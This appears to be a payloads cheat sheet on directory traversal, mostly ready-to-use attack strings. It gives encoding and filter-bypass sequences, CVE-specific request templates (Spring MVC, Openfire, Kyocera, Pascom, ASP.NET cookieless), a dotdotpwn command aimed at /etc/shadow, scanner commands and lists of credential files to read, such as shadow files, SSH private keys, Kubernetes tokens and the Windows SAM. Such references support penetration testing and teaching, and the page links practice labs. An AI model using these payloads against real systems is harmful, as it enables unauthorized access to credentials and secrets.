# Directory Traversal

> Path Traversal, also known as Directory Traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [URL Encoding](#url-encoding)
    * [Double URL Encoding](#double-url-encoding)
    * [Unicode Encoding](#unicode-encoding)
    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
    * [Mangled Path](#mangled-path)
    * [NULL Bytes](#null-bytes)
    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
* [Exploit](#exploit)
    * [UNC Share](#unc-share)
    * [ASPNET Cookieless](#aspnet-cookieless)
    * [IIS Short Name](#iis-short-name)
    * [Java URL Protocol](#java-url-protocol)
* [Path Traversal](#path-traversal)
    * [Linux Files](#linux-files)
    * [Windows Files](#windows-files)
* [Labs](#labs)
* [References](#references)


## Tools

- [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```


## Methodology

We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```


### URL Encoding

| Character | Encoded |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |


**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```


### Double URL Encoding

Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.

| Character | Encoded |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |


**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```


### Unicode Encoding

| Character | Encoded |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |


**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```


### Overlong UTF-8 Unicode Encoding

The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.

| Character | Encoded |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |


### Mangled Path

Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.

```powershell
..././
...\.\
```

**Example:**: Mirasys DVMS Workstation <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```


### NULL Bytes

A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.

**Example:** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```


### Reverse Proxy URL Implementation

Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.

```powershell
..;/
```

**Example**: Pascom Cloud Phone System CVE-2021-45967

A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```


## Exploit

These exploits affect mechanism linked to specific technologies.


### UNC Share

A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.

An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.

```powershell
\\localhost\c$\windows\win.ini
```

Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.


### ASP NET Cookieless

When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.

For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID. 


| .NET Version   | URI                        |
| -------------- | -------------------------- |
| V1.0, V1.1     | /(XXXXXXXX)/               |
| V2.0+          | /(S(XXXXXXXX))/            |
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+          | ...                        |


We can use this behavior to bypass filtered URLs.

* If your application is in the main folder
    ```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

* If your application is in a subfolder
    ```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```

| CVE            | Payload                                        |
| -------------- | ---------------------------------------------- |
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |
| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |


### IIS Short Name

The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
    ```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ```

* [bitquark/shortscan](https://github.com/bitquark/shortscan)
    ```ps1
    shortscan http://example.org/
    ```


### Java URL Protocol

Java's URL protocol when `new URL('')` is used allows the format `url:URL`

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```


## Path Traversal

### Linux Files

* Operating System and Informations
    ```powershell
    /etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
    ```

* Processes 
    ```ps1
    /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor
    /proc/self/environ
    /proc/version
    /proc/cmdline
    /proc/sched_debug
    /proc/mounts
    ```

* Network
    ```ps1
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
    ```

* Current Path
    ```ps1
    /proc/self/cwd/index.php
    /proc/self/cwd/main.py
    ```

* Indexing
    ```ps1
    /var/lib/mlocate/mlocate.db
    /var/lib/plocate/plocate.db
    /var/lib/mlocate.db
    ```

* Credentials and history
    ```ps1
    /etc/passwd
    /etc/shadow
    /home/$USER/.bash_history
    /home/$USER/.ssh/id_rsa
    /etc/mysql/my.cnf
    ```

* Kubernetes
    ```ps1
    /run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/namespace
    /run/secrets/kubernetes.io/serviceaccount/certificate
    /var/run/secrets/kubernetes.io/serviceaccount
    ```


### Windows Files

The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```


## Labs

* [PortSwigger - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
* [PortSwigger - File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
* [PortSwigger - File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
* [PortSwigger - File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
* [PortSwigger - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
* [PortSwigger - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)


## References

- [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
- [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
- [Directory traversal - Portswigger - March 30, 2019](https://portswigger.net/web-security/file-path-traversal)
- [Directory traversal attack - Wikipedia - August 5,  2024](https://en.wikipedia.org/wiki/Directory_traversal_attack)
- [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - November 30, 2023](https://youtu.be/YlZGJ28By8U)
- [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos - 19 June 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
- [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
- [Path Traversal Cheat Sheet: Windows - @HollyGraceful - May 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
- [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - June 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
